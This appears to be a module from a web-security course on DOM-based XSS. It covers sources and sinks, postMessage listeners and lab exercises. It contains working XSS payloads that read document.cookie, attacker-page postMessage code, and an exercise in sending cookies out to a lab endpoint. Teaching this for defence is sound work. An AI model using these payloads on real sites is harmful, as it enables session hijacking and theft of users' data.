Module 09 of 19

DOM-Based XSS
& Client-Side Sinks

DOM XSS is the only XSS class where the server is not involved in the exploitation path. The vulnerable code is JavaScript running in the browser. The attacker controls a source (a DOM property the browser exposes), the code passes it to a sink (a function that executes or renders it), and the XSS fires — with no HTTP request reaching the server.

  • A complete source/sink taxonomy table

Concept 1 — Sources, Sinks, and the DOM XSS Model

DOM XSS is best understood through the taint-tracking model: data that originates from an attacker-controlled source flows through JavaScript code and reaches an execution sink without sanitisation. The source and sink are both client-side constructs.

Sources are DOM properties that an attacker can control without a server request. The most important:

Concept 2 — Why DOM XSS Is Invisible to Server-Side Defences

A server-side WAF, output encoding library, or content security review cannot detect DOM XSS in the general case. Consider the canonical hash-based DOM XSS: 

// Vulnerable page — server sends this (clean, no user data):
<div id="output"></div>
<script>
  const term = decodeURIComponent(location.hash.slice(1));
  document.getElementById('output').innerHTML = term;
</script>

// Attack URL (hash is never sent to server):
// http://victim.com/page#<img src=x onerror=alert(document.cookie)>
//
// The server receives:  GET /page  HTTP/1.1
// No payload, no query, no body — server logs show nothing suspicious.
// The fragment is processed entirely client-side.
PhD Insight — DOM XSS Detection Requires Static Taint Analysis Server-side tools (WAFs, SAST for server code, output encoding linters) cannot find DOM XSS. The correct detection method is client-side taint analysis: instrument the browser's JavaScript engine to track data flow from sources to sinks. Commercial tools (Burp Suite Pro's DOM Invader, Acunetix's DOM scanner) implement approximate taint analysis. Academic research has explored precise static analysis (e.g., FlowDroid adapted for JS) and dynamic instrumentation. For your intervention research, DOM XSS represents a distinct threat class requiring a distinct detection and mitigation approach — lumping it with reflected/stored XSS in your threat model will understate both the problem and the required solution.

Concept 3 — postMessage as a DOM XSS Source

window.postMessage() allows cross-origin communication between browser windows. A page can receive messages from any origin if it adds a message event listener. If the listener passes received data to an HTML sink without validating the sender's origin, any web page can trigger XSS on the victim page by opening it in a new window and posting a payload. 

// Victim page — /message (vulnerable listener):
window.addEventListener('message', function(e) {
  // Missing: if (e.origin !== 'https://trusted.com') return;
  document.getElementById('output').innerHTML = e.data; // sink
});

// Attacker page — any origin:
const victim = window.open('http://localhost:5000/message');
setTimeout(() => {
  victim.postMessage(
    '<img src=x onerror=alert(document.cookie)>',
    '*'  // targetOrigin='*' — send to any origin
  );
}, 1000); // wait for victim to load
Fix — Always Validate e.origin in postMessage Handlers Every message event listener that processes the received data must check e.origin against an explicit allowlist before using e.data. Additionally, even trusted-origin data should be sanitised before being passed to HTML sinks. Trusting origin alone is insufficient if the trusted origin itself can be XSS'd.

Exercises

Warm-up

Exercise 1 — Confirm Hash Is Never Sent to Server

Start Burp Suite and proxy your browser through it. Navigate to: 

http://localhost:5000/dom_lab.html#test-fragment

In Burp → HTTP history, find the request. Does the fragment (#test-fragment) appear anywhere in the request? Check: the request URL, the Referer header, any other header.

Now navigate to the same URL with a payload in the hash: 

http://localhost:5000/dom_lab.html#<img src=x onerror=alert(1)>

Confirm in Burp: the payload is not visible in any server request. Then explain how a server-side WAF would respond to this attack.

Warm-up

Exercise 2 — Payload Syntax Differences by Sink Type

Using the DOM lab, fire a payload against S1 (innerHTML) and S4 (eval). For S1, use an event-handler HTML payload. For S4, use a raw JavaScript expression. Then answer:

  • Why can't you use alert(1) (bare JS) as a payload for the innerHTML sink?
  • Why can't you use <img src=x onerror=alert(1)> as a payload for the eval sink?
  • What property of each sink determines what payload syntax is valid?
Core

Exercise 3 — postMessage Exploit

Open /message in one browser tab. In a different tab (or in the Console of any page on localhost:5000), run: 

const victim = window.open('http://localhost:5000/message');
setTimeout(() => {
  victim.postMessage(
    '<img src=x onerror="alert(\'postMessage XSS: \' + document.domain)">',
    '*'
  );
}, 1500);

Confirm the alert fires in the /message window. Then add the origin check fix to the /message route's event listener. Verify the fix stops the postMessage exploit.

Core

Exercise 4 — AJAX DOM XSS Exfiltration

Using the S7 (JSON API) card, build a payload that:

  • Fires via the /api/search?q= endpoint
  • Exfiltrates document.cookie to /ping?c=
  • Uses zero-interaction execution (onerror on an img tag)

After firing, open DevTools → Network and confirm the /ping?c=... request appears. Note: this is the full AJAX DOM XSS exfil chain — server returns safe JSON, client-side code renders it unsafely, attacker's payload fires and exfiltrates data.

Stretch

Exercise 5 — DOM Breakpoints for Taint Tracking

Chrome DevTools has a "DOM Breakpoints" feature (Elements panel → right-click element → Break on → Subtree modifications). Use it to:

  • Set a subtree modification breakpoint on the #s1-out element in the DOM lab
  • Fire the S1 sink
  • When execution pauses, use the Call Stack panel to trace backward: which JavaScript function set innerHTML? What was the call chain from the event handler to the sink?

This is a manual approximation of the taint-tracking that automated DOM XSS scanners perform. Document the call chain you found. Then research how Burp Suite's DOM Invader performs automated DOM XSS taint tracking — what instrumentation technique does it use?

Module 10 — Stored XSS & Second-Order Attacks

Modules 04–09 covered all the execution mechanism variations using reflected and DOM-based delivery. Module 10 turns to the storage model: XSS payloads that are persisted in a database and served to every subsequent visitor. The lab introduces a minimal in-memory "database" (a Python/Node list) for a comment system, a user-profile store, and an admin panel. Stored XSS payloads are crafted for maximum dwell time — surviving page re-loads, targeting multiple user roles, and escalating to session theft and CSRF. The second-order pattern (payload stored in one context, rendered in a different, more privileged context) is the module's key concept.
